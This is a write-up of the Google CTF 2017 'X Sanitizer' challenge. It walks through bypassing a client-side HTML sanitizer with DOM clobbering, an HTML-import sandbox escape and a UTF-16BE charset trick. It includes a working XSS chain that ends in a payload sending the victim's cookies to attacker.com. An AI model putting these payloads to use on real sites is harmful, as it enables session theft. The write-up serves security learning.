# Google CTF 2017 - The X Sanitizer


## Challenge

```
This is the smallest (50 lines with comments) secure client side HTML sanitizer
on the market today. When using this sanitizer, script tags remove themselves.
Sounds too good to be true? Take a look and prove us wrong if you can.
```

Like most things touting to be secure, it turned out to indeed be too good to be
true. The (simplified) logic of the main page was as follows:

0. Set CSP to `default-src 'self'` (e.g. all content must be from the current
   origin)
0. Get the input value and send it to `sanitize()`
0. Get the output of the sanitizer
0. Set the innerHTML of a div below `Rendered sanitized HTML` to the sanitized
   value

Seems alright. The sanitize function worked in the following manner:

0. Strip `/meta|srcdoc|utf-16be/i`
0. Create an invisible "sandbox" iFrame
0. Append it to the page, and create a message handler to retrieve the output
0. Upon receiving a message, remove the iFrame and send back the result

Additionally, a Service Worker was initialised, which acted as a proxy to all
requests, and prevented external requests when the current window was inside of
the sandbox.

Fetching the sandbox would return the following response, which was then
appended with the input data. For example, loading `/sandbox?html=foo` would
return:

```html
<!doctype HTML>
<script src=sanitize>
</script>
<body>foo
```

Additionally, the following headers were set:

```
X-XSS-Protection: 0
Content-Type: text/html
```

The referenced `sanitize` script was defined as the following:

```javascript
onload = _=> setTimeout(_=> parent.postMessage(document.body.innerHTML, location.origin), 1000);
remove = node => (node == document) ? document.body.innerHTML = '' : node.parentNode.removeChild(node);
document.addEventListener("securitypolicyviolation", e => remove(e.target));
document.write('<meta http-equiv="Content-Security-Policy" content="default-src \\'none\\'; script-src *"><body>');
```

Essentially, this would:

0. Send the current document's `body` back to the main window after 1 second
0. Define a function to remove "bad" nodes
0. Define a handler to remove nodes which violate the CSP
0. Define a CSP permitting nothing by default, but whitelisting `script`
   `link rel=import` to arbitrary sources

Loading any resource except for `/sanitize` while still in the sandbox would
result in the following response:

```
with(document) remove(document === currentScript.ownerDocument ?  currentScript : querySelector('link[rel="import"]'));
// <script src=x></script>
```

So! Given the example text:

```
This is the <s>perfect</s><b>best</b>
<script>alert(document.domain);</script>
<i>HTML sanitizer</i>.
<script src="https://example.com"></script>
```

The following output was returned:

```
This is the <s>perfect</s><b>best</b>

<i>HTML sanitizer</i>.

```

This was quite densely packed with a lot of moving parts for such a small
application.


## Solution


### DOM Clobbering

The first flaw was in the weak declaration of the `remove()` function within the
`/sanitize` script. Were a tag with a name of `remove` sent as input,
`document.remove` will be defined as a reference to that node. The declaration
of the remove function will now fail, as when trying to reference `remove` it
will already be pointing to our node. The assignment of a function to a node
will fail and the script will no longer remove elements.

This allows us to sneak in keeping some elements that are still permitted by
the CSP, such as sending the following:

```
<img name="remove">This is the <s>perfect</s><b>best</b>
<script>alert(document.domain);</script>
<i>HTML sanitizer</i>.
<script src="https://example.com"></script>
```

You now get back the following:

```
<img name="remove">This is the <s>perfect</s><b>best</b>

<i>HTML sanitizer</i>.
<script src="https://example.com"></script>
```


### Sandbox Escape

I spent way too long on this part :( Seeing that I was going to need arbitrary
script content at some point, I was going down the path of trying to bypass the
sandbox by somehow looking as if I were outside the sandbox enough to load
external scripts and appease the more lax CSP using `base` tags or something
weird like that. Unfortunately (or fortunately?), this was not needed at all.

The trick here is that we are now able to add arbitrary HTML content to the
main page through the sanitizer, but we are still bound by the CSP `self`
declaration. Despite this, we can use a `<link rel="import">` to include the
`/sandbox` again. As we are now outside of the sandbox, the `/sanitizer` script
will fail to load and we will be able to add (mostly) arbitrary content to the
main page.

```
<img name="remove">
<link rel="import" href="/sandbox?html={{ encodeURIComponent(content) }}">
```

### Content Spoofing

We now need a way to load arbitrary scripts which pass the CSP `self`. The only
page really available other than the main page is `/sandbox`, which is clearly
HTML content. Despite this, the Service Worker adds a header of
`Content-Type: text/html`, which is missing a charset. Due to this, we are able
to source the page as a script with a charset of UTF-16BE which will coerce the
content into the string
`㰡摯捴祰攠䡔䵌㸊㱳捲楰琠獲挽獡湩瑩穥㸊㰯獣物灴㸊㱢潤社`, which is actually a
valid JavaScript variable name (as per
[this](http://blog.portswigger.net/2016/11/json-hijacking-for-modern-web.html)
blog post by [@garethheyes](https://twitter.com/garethheyes)).

```
<script charset="utf-16be" src="/sandbox?html={{ encodeURIComponent(encode(content)) }}"></script>
```

Note that `utf-16be` is a blacklisted word; however, we can just URL encode the
statement to bypass this.

To begin running arbitrary JavaScript, we just need to append the string with an
assignment to finish the statement. For example, the following payload will pop
an alert with `sanitizer.web.ctfcompetition.com`:

```php
<?php echo urlencode(mb_convert_encoding("=1;\nalert(document.domain);", "UTF-16BE")); ?>
<!-- %00%3D%001%00%3B%00%2F%00%2F%00%0A%00a%00l%00e%00r%00t%00%28%00d%00o%00c%00u%00m%00e%00n%00t%00.%00d%00o%00m%00a%00i%00n%00%29%00%3B -->
```


### Payload

We can get the target to send us their cookies by visiting an attacker page,
such as the following payload:

```javascript
document.location="http://attacker.com?"+encodeURIComponent(document.cookie);
```


### Submission

Putting it all together, we get this monstrosity:

```html
<img name="remove">
<link rel="import" href="/sandbox?html=%3Cscript%20charset%3D%22%75%74%66%2d%31%36%62%65%22%20src%3D%22%2Fsandbox%3Fhtml%3D%2500%253D%25001%2500%253B%2500%250A%2500d%2500o%2500c%2500u%2500m%2500e%2500n%2500t%2500.%2500l%2500o%2500c%2500a%2500t%2500i%2500o%2500n%2500%253D%2500%2522%2500h%2500t%2500t%2500p%2500%253A%2500%252F%2500%252F%2500a%2500t%2500t%2500a%2500c%2500k%2500e%2500r%2500.%2500c%2500o%2500m%2500%253F%2500%2522%2500%252B%2500e%2500n%2500c%2500o%2500d%2500e%2500U%2500R%2500I%2500C%2500o%2500m%2500p%2500o%2500n%2500e%2500n%2500t%2500%2528%2500d%2500o%2500c%2500u%2500m%2500e%2500n%2500t%2500.%2500c%2500o%2500o%2500k%2500i%2500e%2500%2529%2500%253B%22%3E%3C%2Fscript%3E">
```

Submit the solution and wait for the flag to show up in the server logs :)
